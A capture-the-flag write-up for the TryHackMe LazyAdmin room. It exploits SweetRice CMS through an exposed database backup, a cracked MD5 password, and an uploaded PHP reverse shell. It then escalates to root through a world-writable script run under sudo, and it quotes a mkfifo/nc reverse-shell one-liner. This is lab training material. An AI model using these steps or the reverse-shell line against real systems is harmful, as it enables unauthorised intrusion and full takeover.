# LazyAdmin

ROOM: https://tryhackme.com/room/lazyadmin

## Reconnaissance

### Host Discovery

First, I verified that the target machine was online.

```bash
ping 10.48.177.78
```

The host responded successfully, confirming it was reachable. 


### Port Scanning

I used RustScan to quickly identify open ports.

```bash
rustscan -a 10.48.177.78
```

Results:

```text
22/tcp open  ssh
80/tcp open  http
```

To gather more information about the services, I followed up with Nmap.

```bash
nmap -sC -sV -p22,80 10.48.177.78
```

Results:

```text
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache 2.4.18
```

The web server was hosting the default Apache page, so further web enumeration was required. 


## Web Enumeration

### Directory Discovery

I started by enumerating the web root using Gobuster.

```bash
gobuster dir \
-u http://10.48.177.78 \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting findings:

```text
/content
```

Visiting the directory revealed a CMS installation.


### Enumerating `/content`

Running Gobuster again against the discovered directory:

```bash
gobuster dir \
-u http://10.48.177.78/content \
-w /usr/share/wordlists/dirb/common.txt
```

Results:

```text
/content/as
/content/attachment
/content/inc
/content/js
/content/_themes
```

The structure looked familiar and pointed toward **SweetRice CMS**. 


## Finding Exposed Backups

Browsing to:

```text
http://10.48.177.78/content/inc/
```

revealed directory listing was enabled.

Among the directories present was:

```text
/content/inc/mysql_backup/
```

This immediately stood out because backup files often contain credentials or configuration information. 


### Extracting Credentials

Inside the backup file I found the following data:

```php
admin => manager
passwd => 42f749ade7f9e195bf475f37a44cafcb
```

The password was stored as an MD5 hash.

```text
manager : 42f749ade7f9e195bf475f37a44cafcb
```

I cracked the hash and recovered:

```text
Username: manager
Password: Password123
```


## Initial Access

### SweetRice Admin Login

Using the recovered credentials, I logged into the SweetRice administration panel:

```text
http://10.48.177.78/content/as/
```

The login was successful.


### Uploading a Reverse Shell

Inside the admin dashboard, I navigated to:

```text
Media Center
```

I uploaded a PHP reverse shell.

I used the popular PentestMonkey PHP reverse shell and modified it with my attacker IP and listener port.

The file was renamed to:

```text
revshell.php5
```

to bypass upload restrictions.


### Starting a Listener

On my attack machine:

```bash
nc -lnvp 1234
```


### Triggering the Shell

After uploading the file, I clicked it through the Media Center.

A reverse shell connected back immediately.

```text
uid=33(www-data)
```


### Upgrading the Shell

To obtain a fully interactive TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Now I had a stable shell as:

```text
www-data
```


## User Flag

While enumerating the filesystem, I discovered the home directory of a user named:

```text
itguy
```

Inside:

```bash
cd /home/itguy
```

I found:

```text
user.txt
```

Reading the file revealed the user flag:

```text
THM{............}
```


## Privilege Escalation

### Checking Sudo Permissions

The first privilege escalation step was checking sudo permissions.

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

This meant the current user could execute:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

as root without providing a password.


### Analyzing the Perl Script

Viewing the script:

```bash
cat /home/itguy/backup.pl
```

revealed:

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The Perl script simply executed:

```bash
sh /etc/copy.sh
```

with root privileges.

The next step was to inspect the shell script.


### Examining `/etc/copy.sh`

Permissions:

```bash
ls -l /etc/copy.sh
```

Output:

```text
-rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh
```

The critical mistake here was:

```text
others = rwx
```

Meaning any user on the system, including `www-data`, could modify the file.

Viewing its contents:

```bash
cat /etc/copy.sh
```

showed:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Since the file was writable, I replaced its contents.



### Exploiting the Writable Script

Overwrite the file:

```bash
echo '/bin/bash -p' > /etc/copy.sh
```

Now, whenever root executed the script, it would launch a privileged bash shell.

Running the sudo-allowed Perl script:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Result:

```text
root@THM-Chal:/#
```

Verification:

```bash
whoami
```

Output:

```text
root
```

Privilege escalation successful.



## Root Flag

Navigate to root's home directory:

```bash
cd /root
cat root.txt
```

Flag:

```text
THM{...........}
```


